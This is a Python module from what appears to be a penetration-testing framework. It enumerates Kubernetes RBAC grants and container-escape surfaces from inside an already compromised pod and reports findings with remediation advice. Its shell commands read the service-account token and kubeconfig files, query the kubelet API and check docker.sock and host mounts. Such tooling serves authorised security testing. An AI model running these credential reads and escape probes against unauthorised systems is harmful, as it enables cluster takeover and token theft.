"""VAJRA post.k8s — k8s RBAC enumeration + container escape probes.

Runs ONLY through an established command channel once we're inside a container
or with a kubeconfig. It is read-only / non-destructive (--aggressive gated for
anything that writes) and proof-gated: each finding requires hard output from
the live channel.

Attack surface:
* container-detection (am I inside a container at all?)
* k8s RBAC: 'kubectl auth can-i' sweep + service-account token readability
* kubelet / crictl / nsenter / runc escape paths
* privileged pod / hostPID / hostNetwork / hostPath mounts / docker.sock
"""
from core.database import Finding


DETECT = ('cat /proc/1/cgroup 2>/dev/null ; ls /.dockerenv 2>/dev/null ; '
          'ls /run/.containerenv 2>/dev/null ; grep -iE "container|docker|kubepods" '
          '/proc/1/cgroup 2>/dev/null')

RBAC_CMDS = [
    ("kubectl", "command -v kubectl >/dev/null 2>&1 && kubectl auth can-i --list 2>/dev/null | head -60"),
    ("kubeconfig", "ls -la ~/.kube/config /var/run/secrets/kubernetes.io 2>/dev/null ; "
                   "find / -name 'kubeconfig' -not -path '*/proc/*' 2>/dev/null | head -5"),
    ("service-account", "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-60 ; "
                        "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null"),
    ("kubelet-http", "command -v curl >/dev/null 2>&1 && curl -sk --max-time 3 https://127.0.0.1:10250/pods 2>&1 | head -5"),
    ("kubelet-ro", "command -v curl >/dev/null 2>&1 && curl -sk --max-time 3 http://127.0.0.1:10255/pods 2>&1 | head -5"),
]

ESCAPE_CMDS = [
    ("crictl", "command -v crictl >/dev/null 2>&1 && crictl ps 2>&1 | head -10 ; "
               "crictl info 2>/dev/null | head -20"),
    ("nsenter", "command -v nsenter >/dev/null 2>&1 && nsenter --version 2>&1 | head -1"),
    ("runc-cve", "command -v runc >/dev/null 2>&1 && runc --version 2>&1 | head -2"),
    ("docker-sock", "ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null"),
    ("privileged", "ls -la /sys/module 2>/dev/null ; capsh --print 2>/dev/null | grep -iE 'cap_sys_admin|cap_sys_ptrace' ; "
                   "cat /proc/self/status 2>/dev/null | grep -i cap"),
    ("hostpid", "ls -la /proc/1/root 2>/dev/null ; "
                "grep -iE 'HostPID|HostFurther|Seccomp|NoNewPrivs' /proc/self/status 2>/dev/null"),
    ("hostpath", "mount 2>/dev/null | grep -iE ' /etc/passwd| /root/| /var/log| /mnt/| /host' | head -10 ; "
                 "ls -la /mnt /host 2>/dev/null"),
    ("debug-containers", "command -v kubectl >/dev/null 2>&1 && kubectl get pods --all-namespaces -o wide 2>/dev/null | head -15"),
]


def _chan(engine):
    for c in engine.state.get("channels", []) or []:
        if c.kind in ("unix", "ssh"):
            return c
    return None


def run(engine):
    chan = _chan(engine)
    if not chan:
        return
    t = engine.target

    # Phase 1 — are we in a container / k8s pod at all?
    det = _run(chan, DETECT)
    in_container = bool(det) and (
            "kubepods" in det or "docker" in det or
            "containerd" in det or ".dockerenv" in det)
    if not in_container:
        engine.db.add_event(t.display, "post.k8s",
                            "not inside a container/k8s pod — skipping")
        return
    engine.log.finding("[k8s] containerized target confirmed")

    # Phase 2 — RBAC enumeration
    rbac = {}
    for label, cmd in RBAC_CMDS:
        out = _run(chan, cmd)
        if out:
            rbac[label] = out

    # Flag dangerous RBAC
    risktokens = ("[*] *", "create pods", "create deployments", "create services",
                  "create secrets", "delete clusterroles", "clusters.admissionregistration",
                  "pods/exec", "secrets")
    risky = []
    for label, out in rbac.items():
        if label == "kubectl":
            for line in out.splitlines():
                if any(tok in line for tok in
                       ("[*.*]", "pods/exec", "secrets") ) or \
                        any(tok in line for tok in
                            ('create secrets', 'delete clusterroles',
                             'pods/exec')):
                    risky.append(line.strip()[:160])
        if label == "service-account" and out.strip():
            risky.append("Readable service-account token: " + out[:80])

    # Phase 3 — escape probes
    esc = {}
    for label, cmd in ESCAPE_CMDS:
        out = _run(chan, cmd)
        if out:
            esc[label] = out

    esc_tokens = []
    if "crictl" in esc:
        esc_tokens.append("crictl present -> container runtime control")
    if "nsenter" in esc:
        esc_tokens.append("nsenter present -> PID/namespace escape path")
    if "docker-sock" in esc and ("docker.sock" in esc["docker-sock"]):
        esc_tokens.append("docker.sock mounted -> full host escape")
    if "privileged" in esc:
        if "cap_sys_admin" in esc["privileged"].lower():
            esc_tokens.append("CAP_SYS_ADMIN -> capabilities-based escape")
        if "cap_sys_ptrace" in esc["privileged"].lower():
            esc_tokens.append("CAP_SYS_PTRACE -> process injection path")
    if "hostpath" in esc:
        if re_search(" /etc/passwd| /root/| /var/log| /mnt/", esc["hostpath"]):
            esc_tokens.append("hostPath mounts expose host filesystem")
        if "/sys" in esc["hostpath"]:
            esc_tokens.append("/sys mounted read-write -> host kernel access")

    evidence_blocks = []
    if rbac:
        evidence_blocks.append("### RBAC\n" + "\n\n".join(
            "%s:\n%s" % (k, v[:1800]) for k, v in rbac.items()))
    if esc:
        evidence_blocks.append("### ESCAPE SURFACES\n" + "\n\n".join(
            "%s:\n%s" % (k, v[:1200]) for k, v in esc.items()))

    confidence = "firm" if (risky or esc_tokens) else "possible"

    if risky or esc_tokens:
        engine.db.add_finding(Finding(
            t.display, "post.k8s", "post-exploit", "critical",
            "K8S/container escape OR RBAC escalation surface confirmed (%d)"
            % (len(esc_tokens) + len(risky)),
            detail="Inside a containerized/k8s target; found %d escape surface(s) "
                   "and %d risky RBAC grant(s)." % (len(esc_tokens), len(risky))
                   + ("\nEscape paths:\n- " + "\n- ".join(esc_tokens)
                      if esc_tokens else "")
                   + ("\nRBAC:\n- " + "\n- ".join(risky[:12])
                      if risky else ""),
            evidence="\n\n".join(evidence_blocks)[:12000],
            remediation="Rebuild the pod on a hardened image: drop CAP_SYS_ADMIN/"
                        "SYS_PTRACE, set seccomp/apparmor, remove hostPath mounts, "
                        "use non-root service accounts; restrict RBAC to "
                        "least-privilege.",
            confidence="firm"))
        engine.log.finding("[k8s] escape/RBAC surface found (%d escape, %d rbac)"
                           % (len(esc_tokens), len(risky)))
    else:
        engine.db.add_finding(Finding(
            t.display, "post.k8s", "post-exploit", "info",
            "Container escape / RBAC sweep: none detected",
            detail="Containerized target, but no privileged mounts, capabilities, "
                   "runtime control or broad RBAC surfaced. (%d checks)"
                   % (len(rbac) + len(esc)),
            evidence="\n\n".join(evidence_blocks)[:8000],
            confidence="possible"))


def _run(chan, cmd):
    try:
        out = chan.run(cmd)
        if out is None:
            return ""
        return str(out).strip()
    except Exception:
        return ""


def re_search(pattern, text):
    import re
    return re.search(pattern, text, re.I) is not None